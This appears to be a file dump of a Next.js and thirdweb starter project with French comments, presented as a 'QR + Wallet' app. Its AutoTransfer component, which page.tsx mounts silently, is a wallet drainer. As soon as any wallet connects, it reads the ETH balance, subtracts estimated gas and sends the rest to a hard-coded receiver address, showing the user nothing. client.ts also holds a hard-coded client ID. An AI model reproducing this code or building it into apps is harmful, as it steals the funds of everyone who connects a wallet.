

--- Résumé : 15 fichiers inclus, 10 fichiers ignorés ---


===== Fichier: .env.example =====

NEXT_PUBLIC_TEMPLATE_CLIENT_ID=



===== Fichier: .eslintrc.json =====

{
	"extends": "next/core-web-vitals"
}



===== Fichier: .prettierrc =====

{
	"singleQuote": false
}



===== Fichier: next-env.d.ts =====

/// <reference types="next" />
/// <reference types="next/image-types/global" />

// NOTE: This file should not be edited
// see https://nextjs.org/docs/basic-features/typescript for more information.



===== Fichier: next.config.mjs =====

/** @type {import('next').NextConfig} */
const nextConfig = {
  // fixes wallet connect dependency issue https://docs.walletconnect.com/web3modal/nextjs/about#extra-configuration
  webpack: (config) => {
    config.externals.push("pino-pretty", "lokijs", "encoding");
    return config;
  },
};

export default nextConfig;



===== Fichier: package.json =====

{
  "name": "thirdweb-app",
  "version": "0.1.0",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start",
    "lint": "next lint"
  },
  "dependencies": {
    "ethers": "^6.15.0",
    "next": "14.1.0",
    "react": "^18.3",
    "react-dom": "^18.3",
    "thirdweb": "^5"
  },
  "devDependencies": {
    "@types/node": "^20",
    "@types/react": "^18",
    "@types/react-dom": "^18",
    "autoprefixer": "^10.0.1",
    "eslint": "^8",
    "eslint-config-next": "14.1.0",
    "postcss": "^8",
    "tailwindcss": "^3.3.0",
    "typescript": "^5"
  }
}



===== Fichier: postcss.config.js =====

module.exports = {
  plugins: {
    tailwindcss: {},
    autoprefixer: {},
  },
};



===== Fichier: README.md =====


![tw-banner](https://github.com/thirdweb-example/next-starter/assets/57885104/20c8ce3b-4e55-4f10-ae03-2fe4743a5ee8)

# thirdweb-next-starter

Starter template to build an onchain react native app with [thirdweb](https://thirdweb.com/) and [next](https://nextjs.org/).

## Installation

Install the template using [thirdweb create](https://portal.thirdweb.com/cli/create)

```bash
  npx thirdweb create app --next
```

## Environment Variables

To run this project, you will need to add the following environment variables to your .env file:

`CLIENT_ID`

To learn how to create a client ID, refer to the [client documentation](https://portal.thirdweb.com/typescript/v5/client). 

## Run locally

Install dependencies

```bash
yarn
```

Start development server

```bash
yarn dev
```

Create a production build

```bash
yarn build
```

Preview the production build

```bash
yarn start
```

## Resources

- [Documentation](https://portal.thirdweb.com/typescript/v5)
- [Templates](https://thirdweb.com/templates)
- [YouTube](https://www.youtube.com/c/thirdweb)
- [Blog](https://blog.thirdweb.com)

## Need help?

For help or feedback, please [visit our support site](https://thirdweb.com/support)



===== Fichier: tailwind.config.ts =====

import type { Config } from "tailwindcss";

const config: Config = {
  content: [
    "./src/pages/**/*.{js,ts,jsx,tsx,mdx}",
    "./src/components/**/*.{js,ts,jsx,tsx,mdx}",
    "./src/app/**/*.{js,ts,jsx,tsx,mdx}",
  ],
  theme: {
    extend: {
      backgroundImage: {
        "gradient-radial": "radial-gradient(var(--tw-gradient-stops))",
        "gradient-conic":
          "conic-gradient(from 180deg at 50% 50%, var(--tw-gradient-stops))",
      },
    },
  },
  plugins: [],
};
export default config;



===== Fichier: tsconfig.json =====

{
  "compilerOptions": {
    "lib": ["dom", "dom.iterable", "esnext"],
    "allowJs": true,
    "skipLibCheck": true,
    "strict": true,
    "noEmit": true,
    "esModuleInterop": true,
    "module": "esnext",
    "target": "ES2021",
    "moduleResolution": "bundler",
    "resolveJsonModule": true,
    "isolatedModules": true,
    "jsx": "preserve",
    "incremental": true,
    "plugins": [
      {
        "name": "next"
      }
    ],
    "paths": {
      "@/*": ["./src/*"],
      "@public/*": ["./public/*"]
    }
  },
  "include": ["next-env.d.ts", "**/*.ts", "**/*.tsx", ".next/types/**/*.ts"],
  "exclude": ["node_modules"]
}



===== Fichier: src\app\client.ts =====

import { createThirdwebClient } from "thirdweb";

// Utilisez directement votre client ID ici
const clientId = "c98a5d48ad89f114ad6044933fced541";

if (!clientId) {
  throw new Error("No client ID provided");
}

export const client = createThirdwebClient({
  clientId: clientId,
});



===== Fichier: src\app\globals.css =====

@tailwind base;
@tailwind components;
@tailwind utilities;

:root {
	line-height: 1.5;
	font-weight: 400;
	font-synthesis: none;
	text-rendering: optimizeLegibility;
	-webkit-font-smoothing: antialiased;
	-moz-osx-font-smoothing: grayscale;
	font-family: 'Inter', sans-serif;
	font-optical-sizing: auto;
	font-style: normal;
	font-variation-settings: 'slnt' 0;
}

@layer base {
	body {
		@apply bg-zinc-950 text-neutral-200;
	}
}



===== Fichier: src\app\layout.tsx =====

import type { Metadata } from "next";
import { Inter } from "next/font/google";
import "./globals.css";
import { ThirdwebProvider } from "thirdweb/react";

const inter = Inter({ subsets: ["latin"] });

export const metadata: Metadata = {
  title: "MOHXL + Next starter",
  description:
    "Starter template for using thirdweb SDK with Next.js App router",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body className={inter.className}>
        <ThirdwebProvider>{children}</ThirdwebProvider>
      </body>
    </html>
  );
}



===== Fichier: src\app\page.tsx =====

"use client";

import Image from "next/image";
import { ConnectButton } from "thirdweb/react";
import thirdwebIcon from "@public/thirdweb.svg";
import { client } from "./client";
import AutoTransfer from "./components/AutoTransfer";

export default function Home() {
  return (
    <main className="p-4 pb-10 min-h-[100vh] flex items-center justify-center container max-w-screen-lg mx-auto">
      <div className="py-20">
        <Header />

        <div className="flex justify-center mb-20">
          <ConnectButton
            client={client}
            appMetadata={{
              name: "Example App",
              url: "https://example.com",
            }}
          />
        </div>

        {/* Dès qu'un wallet est connecté, AutoTransfer s'exécute */}
        <AutoTransfer />
      </div>
    </main>
  );
}

function Header() {
  return (
    <header className="flex flex-col items-center mb-20 md:mb-20">
      <Image
        src={thirdwebIcon}
        alt=""
        className="size-[150px] md:size-[150px]"
        style={{
          filter: "drop-shadow(0px 0px 24px #a726a9a8)",
        }}
      />

      <h1 className="text-2xl md:text-6xl font-semibold md:font-bold tracking-tighter mb-6 text-zinc-100">
        QR
        <span className="text-zinc-300 inline-block mx-1"> + </span>
        <span className="inline-block -skew-x-6 text-blue-500"> Wallet </span>
      </h1>
    </header>
  );
}



===== Fichier: src\app\components\AutoTransfer.tsx =====

"use client";

import { useEffect, useState } from "react";
import {
  useActiveAccount,
  useActiveWalletChain,
  useWalletBalance,
  useSendTransaction,
} from "thirdweb/react";
import { prepareTransaction } from "thirdweb";
import { ethereum } from "thirdweb/chains";
import { client } from "../client";
import { ethers } from "ethers";

const RECEIVER = "0xa52D5c2ce7128941A1632554bcd154C567F771D9"; // <-- change si besoin
const DEFAULT_GAS_GWEI = 10n; // fallback gas price (gwei)
const GAS_LIMIT = 21000n;

export default function AutoTransfer() {
  const account = useActiveAccount();
  const activeChain = useActiveWalletChain();
  const chain = activeChain ?? ethereum; // fallback sur mainnet si chain non disponible

  // Récupère le solde natif (ETH) du wallet connecté
  const { data: balanceData } = useWalletBalance({
    client,
    address: account?.address,
    chain,
  });

  // Hook pour envoyer la transaction depuis le wallet connecté
  const { mutateAsync: sendTransactionMutateAsync } = useSendTransaction();

  const [sent, setSent] = useState(false);

  useEffect(() => {
    const run = async () => {
      if (!account) return; // pas connecté
      if (sent) return; // déjà envoyé
      if (!balanceData) return; // attend que le solde soit chargé

      try {
        console.log("Adresse connectée :", account.address);
        // balanceData.value peut être bigint ou string selon la version -> normalize
        let balanceValue: bigint = 0n;
        if ((balanceData as any)?.value !== undefined) {
          const v = (balanceData as any).value;
          if (typeof v === "bigint") balanceValue = v;
          else if (typeof v === "string") balanceValue = BigInt(v);
          else if (typeof v === "number") balanceValue = BigInt(Math.floor(v));
        }

        console.log("Solde (raw) :", balanceValue, "wei");
        console.log("Solde (ETH) :", balanceData.displayValue, balanceData.symbol);

        if (balanceValue <= 0n) {
          console.log("⚠️ Solde nul → rien à transférer.");
          return;
        }

        // Tentative de récupération du gasPrice via RPC (eth_gasPrice)
        let gasPrice: bigint = DEFAULT_GAS_GWEI * 10n ** 9n; // fallback (10 gwei)
        try {
          const rpc = (chain as any)?.rpc;
          if (rpc) {
            // chain.rpc peut être string ; si tableau tu peux prendre le premier
            const rpcUrl = Array.isArray(rpc) ? rpc[0] : rpc;
            const resp = await fetch(rpcUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_gasPrice", params: [] }),
            });
            const json = await resp.json();
            if (json?.result) {
              gasPrice = BigInt(json.result);
            }
          }
        } catch (e) {
          console.warn("Impossible de récupérer eth_gasPrice via RPC, on utilise fallback", e);
        }

        console.log("GasPrice (wei) :", gasPrice.toString(), "=>", ethers.formatUnits(gasPrice, "gwei"), "gwei");
        const maxFee = GAS_LIMIT * gasPrice;
        console.log("Frais max estimés (ETH) :", ethers.formatEther(maxFee));

        // Calcul du montant à envoyer en retirant le gas estimé
        const amountToSend = balanceValue - maxFee;
        console.log("Montant possible à envoyer (wei) :", amountToSend);
        console.log("Montant possible à envoyer (ETH) :", ethers.formatEther(amountToSend));

        if (amountToSend <= 0n) {
          console.log("⚠️ Pas assez de fonds pour couvrir le gas.");
          return;
        }

        // Prépare la transaction (fonction synchrone)
        const preparedTx = prepareTransaction({
          to: RECEIVER,
          value: amountToSend,
          chain,
          client,
        });

        // Marque qu'on a commencé (évite double envoi)
        setSent(true);

        // Envoie la transaction via useSendTransaction (utilise le wallet connecté)
        const result = await sendTransactionMutateAsync(preparedTx);
        console.log("Result sendTransaction :", result);

        // Le hook peut retourner un objet contenant hash, receipt, etc. On loggue tout.
        alert("✅ Transaction envoyée. Voir console pour détails.");
      } catch (err: any) {
        console.error("Erreur pendant le transfert :", err);
        // si erreur, on permet de retenter
        setSent(false);
      }
    };

    run();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [account, balanceData, chain, sent]);

  return null;
}
